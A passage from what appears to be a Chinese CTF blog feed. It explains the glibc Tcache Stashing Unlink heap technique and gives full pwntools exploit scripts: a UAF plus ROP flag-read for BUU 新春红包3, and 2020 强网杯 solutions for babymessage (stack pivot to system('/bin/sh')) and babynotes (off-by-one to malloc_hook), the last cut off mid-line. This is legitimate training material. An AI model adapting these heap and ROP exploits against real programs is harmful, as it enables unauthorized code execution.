bin</code>中加入指定的堆块，进而在内存中分配一个指定的<code>chunk</code>。当前前提是我们需要绕过下面的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这其中<code>bck</code>就是我们伪造的<code>bk</code>指针，因此我们只要在指定的位置写入一个堆内存地址（<code>victim</code>的地址），就可以绕过该检查。</p><h2 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h2><p>从上面的代码中我们可以看到，在<code>small bin</code>分配之后，如果<code>small bin</code>链表中仍然存在堆块，并且对应的<code>tcache list</code>不为空的话，就会将<code>small bin</code>链表中所有的堆块放入到<code>tcache</code>中。当然要发生这种分配的方式必须可以越过<code>tcache</code>分配堆块，因为<code>malloc</code>在<code>tcache</code>中存在堆块的时候会首先在<code>tcache</code>中返回堆块，<code>calloc</code>则不经过<code>tcache</code>。</p><p>注意此时加入<code>tcache</code>的部分没有进行安全检查。那么之后攻击方式与<code>House of Lore Attack</code>相同。但是这里需要注意的是<code>tcache</code>将所有的<code>small bin</code>加入<code>tcache</code>的特性</p><ul><li><p><code>tcache</code>中有一个空位，<code>small bin</code>中需要一个<code>chunk</code>。可以在指定地址(<code>bk+0x10</code>)中写入<code>main_arena</code>附近的地址，而且不用再指定地址<code>+0x10</code>处写入可写内存的地址</p></li><li><p><code>tcache</code>中有两个空位，<code>small bin</code>中需要两个<code>chunk</code>。可以在指定地址中写入<code>main_arena</code>附近的地址，分配指定位置的<code>chunk</code>。但是需要构造下面的<code>chunk</code>链</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Tcache%20Stashing%20Unlink%20Attack%20%E5%88%A9%E7%94%A8%20/Untitled.png" alt="Tcache%20Stashing%20Unlink%20Attack%20%E5%88%A9%E7%94%A8%2072c8c71da0e14498b4f5be4d6ad9861a/Untitled.png"></p><p><code>small bin</code>中有两个<code>chunk</code>，我们需要将第一个<code>chunk</code>的<code>bk</code>指针覆写为<code>fake_chunk-0x10</code>，<code>fake_chunk</code>即我们想要分配到的内存地址。之后需要将<code>fake_chunk+0x10</code>的位置写入一个具有可写权限的内存地址，因为将会在此地址处写入<code>main_arena</code>附近的地址。那么之后申请一次<code>0x90</code>大小的堆块，就会将<code>fake_chunk</code>放入到<code>tcache</code>中，用<code>malloc</code>申请就可以得到该<code>chunk</code>。</p></li></ul><h2 id="GeekPwn-2020-云靶场挑战赛热身赛-playthenew"><a href="#GeekPwn-2020-云靶场挑战赛热身赛-playthenew" class="headerlink" title="GeekPwn 2020 云靶场挑战赛热身赛 playthenew"></a>GeekPwn 2020 云靶场挑战赛热身赛 playthenew</h2><p>该题目利用<code>Tcache Stashing Unlink</code>向指定位置写入了<code>main_arena</code>附近的地址，绕过程序的检查，从而向特定地址写入<code>rop</code>链，利用程序原有的函数调用执行<code>rop</code>。</p><h2 id="高校战疫网络安全分享赛-2020-twochunk"><a href="#高校战疫网络安全分享赛-2020-twochunk" class="headerlink" title="高校战疫网络安全分享赛 2020 twochunk"></a>高校战疫网络安全分享赛 2020 twochunk</h2><p>改题目利用<code>Tcache Stashing Unlink</code>，堆溢出，分配<code>mmap_address</code>处的内存，进行函数布局，利用程序原有的函数调用执行<code>system</code></p><h2 id="BUU-新春红包3"><a href="#BUU-新春红包3" class="headerlink" title="BUU 新春红包3"></a>BUU 新春红包3</h2><p>程序提供了四种功能<code>add,delete,change,show</code>，在删除的时候存在<code>UAF</code>漏洞。程序只提供特定大小的堆块分配<code>0x10,0xf0,0x400,0x300</code>。当用户输入是<code>666</code>的时候会提供一个栈溢出的函数，该函数的调用需要满足条件</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/Tcache%20Stashing%20Unlink%20Attack%20%E5%88%A9%E7%94%A8%20/Untitled%201.png" alt="Tcache%20Stashing%20Unlink%20Attack%20%E5%88%A9%E7%94%A8%2072c8c71da0e14498b4f5be4d6ad9861a/Untitled%201.png"></p><p>我们可以通过<code>Tcache Stashing Unlink</code>来讲<code>mmap_address+0x800</code>更改为<code>main_arena</code>附近的地址就可以绕过该检查。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>由于存在<code>UAF</code>，因此<code>libc</code>基址泄露和堆地址泄露就很容易了。至于<code>Tcache Stashing Unlink</code>的构造可以利用<code>0x400,0x300</code>的大小分配得到<code>0x90</code>大小的两个<code>small bin</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./RedPacket_SoEasyPwn1&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/pwn/Desktop/glibc/x64/glibc-2.29/lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">size_dirct = &#123;<span class="number">0x10</span>: <span class="string">&quot;1&quot;</span>, <span class="number">0xf0</span>: <span class="string">&quot;2&quot;</span>, <span class="number">0x300</span>: <span class="string">&quot;3&quot;</span>, <span class="number">0x400</span>: <span class="string">&quot;4&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content=<span class="string">&quot;12&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;red packet idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;4.0x400): &quot;</span>, size_dirct.get(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;red packet idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;red packet idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;red packet idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_over</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>, <span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;want to say?&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">global_change_time = <span class="number">0x555555558010</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(i, <span class="number">0xf0</span>)</span><br><span class="line">    delete(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x400</span>)</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;tcache bin filled&quot;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x400</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x400</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">heap_address = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;heap address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_address)))</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\\x00&quot;</span>)) - <span class="number">96</span> - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x400</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x400</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x400</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x400</span>, <span class="string">&quot;./flag\\x00&quot;</span>)</span><br><span class="line">gdb.attach(p, <span class="string">&#x27;b*0x555555555910&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>, cyclic(<span class="number">0x308</span>) + p64(<span class="number">0x101</span>) + p64(heap_address + <span class="number">0x1340</span>) + p64(heap_address - <span class="number">0x2a60</span> - <span class="number">0x10</span> + <span class="number">0x800</span>))</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x00000000000329c3</span> + libc.address</span><br><span class="line">p_rdi_r = <span class="number">0x0000000000022186</span> + libc.address</span><br><span class="line">p_rsi_r = <span class="number">0x0000000000021d75</span> + libc.address</span><br><span class="line">p_rdx_r = <span class="number">0x0000000000001b9a</span> + libc.address</span><br><span class="line">p_rax_r = <span class="number">0x00000000000a84e7</span> + libc.address</span><br><span class="line">syscall_address = <span class="number">0x00000000000aa015</span> + libc.address</span><br><span class="line">flag_address = heap_address + <span class="number">0x1860</span></span><br><span class="line">row = flat([</span><br><span class="line">    p_rdi_r,</span><br><span class="line">    flag_address,</span><br><span class="line">    p_rsi_r, <span class="number">0</span>,</span><br><span class="line">    p_rax_r, <span class="number">0</span>,</span><br><span class="line">    libc.sym[<span class="string">&#x27;open&#x27;</span>],</span><br><span class="line">    p_rdi_r,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    p_rsi_r,</span><br><span class="line">    flag_address-<span class="number">0x200</span>,</span><br><span class="line">    p_rdx_r,</span><br><span class="line">    <span class="number">0x100</span>,</span><br><span class="line">    libc.sym[<span class="string">&#x27;read&#x27;</span>],</span><br><span class="line">    p_rdi_r,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    p_rsi_r,</span><br><span class="line">    flag_address-<span class="number">0x200</span>,</span><br><span class="line">    p_rdx_r,</span><br><span class="line">    <span class="number">0x100</span>,</span><br><span class="line">    libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">])</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xf0</span>, p64(<span class="number">0</span>) + row)</span><br><span class="line">stack_over(cyclic(<span class="number">0x80</span>) + p64(heap_address + <span class="number">0x1350</span>) + p64(leave_ret))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN总结 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020 强网杯线上赛 WP</title>
      <link href="/posts/3542521002.html"/>
      <url>/posts/3542521002.html</url>
      
        <content type="html"><![CDATA[<h2 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h2><h3 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h3><p>栈溢出漏洞，通过<code>0x10</code>的输入修改<code>rbp</code>，通过判断，使得输入的大小改为<code>0x100</code>，修改返回地址，调用<code>puts</code>泄露<code>libc</code>地址，由于<code>rbp</code>改变，在进行一遍覆盖<code>rbp</code>，覆盖返回地址即可<code>getshell</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./babymessage&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *0x400963\\n&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/pwn/Desktop/glibc/x64/glibc-2.27/lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;123.56.170.202&#x27;</span>, <span class="number">21342</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave_name</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: \\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;name: \\n&quot;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave_message</span>(<span class="params">message</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: \\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;message: \\n&quot;</span>, message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_message</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: \\n&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shut</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: \\n&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">p_rdi_r = <span class="number">0x400ac3</span></span><br><span class="line">p_rsi_r15_r = <span class="number">0x400ac1</span></span><br><span class="line">call_write = <span class="number">0x400904</span></span><br><span class="line">call_puts = <span class="number">0x40087C</span></span><br><span class="line">main_address = <span class="number">0x4009DD</span></span><br><span class="line">mm_address = <span class="number">0x6010c0</span></span><br><span class="line">leave_message_address = <span class="number">0x400821</span></span><br><span class="line">jmp_rbp = <span class="number">0x0000000000400d23</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400886</span></span><br><span class="line">work_address = <span class="number">0x40091A</span></span><br><span class="line"></span><br><span class="line">leave_name(<span class="string">&quot;9999&quot;</span>)</span><br><span class="line">leave_message(p64(leave_ret) + p64(mm_address + <span class="number">0x18</span>-<span class="number">0x4</span>))</span><br><span class="line">leave_message(p64(leave_ret) + p64(mm_address + <span class="number">0x8</span>) + p64(p_rdi_r) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(work_address))</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\\x00&quot;</span>)) - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line">leave_message(<span class="string">b&quot;b&quot;</span>*<span class="number">0x8</span> + p64(mm_address + <span class="number">0x18</span>-<span class="number">0x4</span>))</span><br><span class="line">leave_message(p64(leave_ret) + p64(mm_address + <span class="number">0x18</span>-<span class="number">0x4</span>) + p64(p_rdi_r) + p64(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()) + p64(p_rsi_r15_r) + p64(<span class="number">0</span>)*<span class="number">2</span> +  p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="babynotes"><a href="#babynotes" class="headerlink" title="babynotes"></a>babynotes</h3><p>在<code>reset</code>申请<code>0x18</code>大小的堆块，之后进行<code>strcpy</code>的时候存在<code>off-by-one</code>漏洞</p><p>首先通过<code>unsorted bin</code> 残留的地址泄露出<code>libc</code>基址，接着利用<code>off-by-one</code>漏洞造成<code>chunk extend</code>，释放之后再次申请就可以直接控制下一个<code>chunk</code>的<code>fd</code>指针，<code>fastbin attack</code>覆写<code>malloc_hook</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./babynotes&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *0x400F67&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0xf1207</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;123.56.170.202&#x27;</span>, <span class="number">43121</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0xf1207</span></span><br><span class="line"></span><br><span class="line">bbs_address = <span class="number">0x6020c0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">regesit</span>(<span class="params">name, motto, age</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;name: \\n&quot;</span>, name)</span><br><span class="line">    p.sendafter(<span class="string">&quot;motto: \\n&quot;</span>, motto)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;age: \\n&quot;</span>, <span class="built_in">str</span>(age))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input note size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Note &#123;&#125;: &quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(index)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Input your note: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset</span>(<span class="params">name, motto, age</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    regesit(name, motto, age)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shut</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;7&quot;</span>)</span><br><span class="line"></span><br><span class="line">regesit(<span class="string">&quot;12&quot;</span>, <span class="string">&quot;12&quot;</span>, bbs_address)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x18</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xd0</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x28</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\\x00&quot;</span>)) - <span class="number">88</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">reset(cyclic(<span class="number">0x18</span>), cyclic(<span class="number">0x20</span>), <span class="number">0xe1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xd0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, cyclic(<span class="number">0x68</span>) + p64(<span class="number">0x71</span>) + p64(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span 